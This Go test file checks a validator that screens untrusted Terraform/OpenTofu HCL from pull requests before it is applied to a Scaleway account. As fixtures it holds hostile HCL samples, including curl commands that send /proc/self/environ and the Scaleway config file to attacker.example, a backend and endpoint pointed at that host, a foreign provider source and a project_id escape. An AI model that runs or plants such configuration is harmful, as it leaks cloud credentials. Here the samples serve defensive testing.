package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

var gateAllowlist = []string{"scaleway_account_project", "scaleway_block_volume", "scaleway_lb*"}

func writeShapeHCL(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.tf"), []byte(body), 0o600); err != nil {
		t.Fatalf("write hcl: %v", err)
	}
	return dir
}

// A realistic minimum: every Layer 3 stack declares its provider source
// and creates its own project.
const shapeProject = `
terraform {
  required_providers {
    scaleway = {
      source = "scaleway/scaleway"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }
`

// The bypass that retired the regex. `resource /*x*/ "..."` is valid HCL
// that a `resource\s+"` pattern does not match, and the grammar permits
// comments almost anywhere, so no expression closes the class.
func TestLayer3ShapeCatchesCommentObfuscatedResource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource /*sneaky*/ "scaleway_k8s_cluster" "expensive" {
  name = "nope"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("comment-obfuscated disallowed resource must be refused")
	}
	if !strings.Contains(err.Error(), "scaleway_k8s_cluster") {
		t.Errorf("error did not name the type: %v", err)
	}
}

// data "external" runs its program at PLAN time, with the cloud credentials
// in the environment. Restricting data sources to the cloud under test
// removes the family rather than naming the dangerous member.
func TestLayer3ShapeRefusesExternalDataSource(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
data "external" "exfil" {
  program = ["sh", "-c", "curl -d @/proc/self/environ https://attacker.example"]
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("an external data source must be refused")
	}
}

func TestLayer3ShapeRefusesProvisioner(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  provisioner "local-exec" {
    command = "curl -d @$HOME/.config/scw/config.yaml https://attacker.example"
  }
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a provisioner must be refused")
	}
	if !strings.Contains(err.Error(), "provisioner") {
		t.Errorf("error did not name the construct: %v", err)
	}
}

func TestLayer3ShapeRefusesModule(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`module "anything" { source = "./expensive" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a module must be refused — it declares resources this check cannot see")
	}
}

func TestLayer3ShapeRefusesForeignProvider(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`provider "external" {}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a non-scaleway provider must be refused")
	}
}

// Unparseable means unknowable, and this path applies to a real cloud.
func TestLayer3ShapeRefusesUnparseableHCL(t *testing.T) {
	dir := writeShapeHCL(t, `resource "scaleway_block_volume" "broken" {`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("unparseable HCL must be refused rather than applied")
	}
	if !strings.Contains(err.Error(), "cannot parse") {
		t.Errorf("error should say it could not parse: %v", err)
	}
}

// It must accept what Layer 3 actually generates, or it blocks every run.
func TestLayer3ShapeAcceptsRealGeneratedStack(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway" }
  }
}
provider "scaleway" {}
variable "size" {
  type    = number
  default = 5
}
resource "scaleway_account_project" "main" { name = "run" }
resource "scaleway_block_volume" "data" {
  name       = "d"
  size_in_gb = var.size
  project_id = scaleway_account_project.main.id
}
output "project_id" { value = scaleway_account_project.main.id }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("a legitimate Layer 3 stack was refused: %v", err)
	}
}

// A provider binary is code. `tofu init` downloads and executes it with the
// cloud credentials in the environment, and this path lets a pull request
// choose the registry address.
func TestLayer3ShapeRefusesForeignProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "attacker/scaleway"
      version = "1.0.0"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a non-canonical provider source must be refused")
	}
	if !strings.Contains(err.Error(), "scaleway/scaleway") {
		t.Errorf("error did not name the required source: %v", err)
	}
}

func TestLayer3ShapeAcceptsCanonicalProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = {
      source  = "scaleway/scaleway"
      version = "~> 2.50"
    }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("the canonical provider source was refused: %v", err)
	}
}

// The endpoint comes from the sealed environment and nowhere else (S139).
// A provider block accepting api_url would let a fixture retarget a "real"
// apply at something that is not the real cloud.
func TestLayer3ShapeRefusesProviderEndpointOverride(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" { api_url = "https://attacker.example" }`+"\n"+shapeProject)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a provider api_url override must be refused")
	}
	if !strings.Contains(err.Error(), "api_url") {
		t.Errorf("error did not name the setting: %v", err)
	}
}

// project_id would move resources out of the disposable per-run project
// that bounds blast radius.
func TestLayer3ShapeRefusesProviderProjectOverride(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" { project_id = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92" }`+"\n"+shapeProject)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a provider project_id override must be refused")
	}
}

func TestLayer3ShapeAllowsRegionAndZoneOnProvider(t *testing.T) {
	dir := writeShapeHCL(t, `provider "scaleway" {
  region = "fr-par"
  zone   = "fr-par-1"
}`+"\n"+shapeProject)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("region/zone are placement, not identity, and must be allowed: %v", err)
	}
}

// tofu loads .tf.json exactly as it loads .tf, and this validator parses
// native HCL only — so a JSON file would sail past it.
func TestLayer3ShapeRefusesTfJSON(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject)
	if err := os.WriteFile(filepath.Join(dir, "sneaky.tf.json"),
		[]byte(`{"resource":{"scaleway_k8s_cluster":{"c":{"name":"x"}}}}`), 0o600); err != nil {
		t.Fatalf("write json: %v", err)
	}

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal(".tf.json must be refused — tofu reads it and this check does not")
	}
	if !strings.Contains(err.Error(), "tf.json") {
		t.Errorf("error did not name the file type: %v", err)
	}
}

// lifecycle carries precondition/postcondition, whose error_message is an
// expression evaluated at plan time and surfaced in tofu's output.
func TestLayer3ShapeRefusesLifecycleBlock(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  lifecycle {
    precondition {
      condition     = false
      error_message = file("/proc/self/environ")
    }
  }
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a lifecycle block must be refused on the untrusted path")
	}
}

// Omitting required_providers is not a safe default: tofu resolves
// scaleway_* from the default namespace, which is a choice the
// configuration made implicitly rather than one this check verified.
func TestLayer3ShapeRequiresDeclaredProviderSource(t *testing.T) {
	dir := writeShapeHCL(t, `resource "scaleway_account_project" "main" { name = "x" }
resource "scaleway_block_volume" "v" { size_in_gb = 1 }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("HCL with no declared provider source must be refused")
	}
	if !strings.Contains(err.Error(), "resolved implicitly") {
		t.Errorf("error did not explain the omission: %v", err)
	}
}

// tofu init processes backend configuration before any apply. A PR-chosen
// backend would have the secret-bearing job contact it, and would move
// state off the local terraform-live.tfstate that every cleanup and sweep
// decision reads.
func TestLayer3ShapeRefusesBackendBlock(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway" }
  }
  backend "http" {
    address = "https://attacker.example/state"
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("a backend block must be refused — cleanup reads local state")
	}
}

// A correct source under a name nothing uses leaves `scaleway` itself
// resolving implicitly, which is precisely what the source check exists
// to prevent.
func TestLayer3ShapeRejectsCanonicalSourceUnderWrongLocalName(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    foo = { source = "scaleway/scaleway" }
  }
}
resource "scaleway_account_project" "main" { name = "x" }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("only the scaleway local name may satisfy the requirement")
	}
	if !strings.Contains(err.Error(), "resolved implicitly") {
		t.Errorf("error did not explain the gap: %v", err)
	}
}

// Declaring a scaleway_account_project satisfies the existence check while
// the actual resources are pinned somewhere else entirely — on this account,
// "somewhere else" includes the project holding live infrastructure.
func TestLayer3ShapeRefusesLiteralProjectID(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a literal project_id must be refused — it escapes the disposable project")
	}
	if !strings.Contains(err.Error(), "project_id") {
		t.Errorf("error did not name the attribute: %v", err)
	}
}

func TestLayer3ShapeRefusesProjectIDFromVariable(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
variable "target" {
  type    = string
  default = "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = var.target
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("project_id from a variable must be refused")
	}
}

// The legitimate shape: bound to the stack's own project.
func TestLayer3ShapeAcceptsProjectIDBoundToOwnProject(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "data" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.id
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
		t.Errorf("a resource bound to its own project was refused: %v", err)
	}
}

// Mentioning the disposable project is not the same as using it.
// Expr.Variables() reports which traversals appear, not what the
// expression evaluates to.
func TestLayer3ShapeRefusesProjectIDExpressionThatOnlyMentionsTheProject(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.id != "" ? "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92" : "0b6a8a6a-7242-4852-a0cb-ac2e4fc86b92"
}`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("an expression that merely references the project must be refused")
	}
	if !strings.Contains(err.Error(), "direct reference") {
		t.Errorf("error did not explain the requirement: %v", err)
	}
}

// .name is also a reference to the project, but the name is chosen by the
// PR and can be set to any existing project's UUID.
func TestLayer3ShapeRefusesProjectIDFromNonIDAttribute(t *testing.T) {
	dir := writeShapeHCL(t, shapeProject+`
resource "scaleway_block_volume" "escapee" {
  size_in_gb = 1
  project_id = scaleway_account_project.main.name
}`)

	if err := validateLayer3HCLShape(dir, gateAllowlist); err == nil {
		t.Fatal("project_id must be the project's .id, not an attribute the PR chooses")
	}
}

// The generation-path check is a substring scan, which a comment satisfies.
// On the untrusted path the parser decides.
func TestLayer3ShapeRefusesCommentedOutProjectResource(t *testing.T) {
	dir := writeShapeHCL(t, `
terraform {
  required_providers {
    scaleway = { source = "scaleway/scaleway" }
  }
}
# resource "scaleway_account_project" "main" {}
resource "scaleway_block_volume" "orphan" { size_in_gb = 1 }`)

	err := validateLayer3HCLShape(dir, gateAllowlist)
	if err == nil {
		t.Fatal("a commented-out project must not satisfy the containment requirement")
	}
	if !strings.Contains(err.Error(), "disposable project") {
		t.Errorf("error did not explain the requirement: %v", err)
	}
}
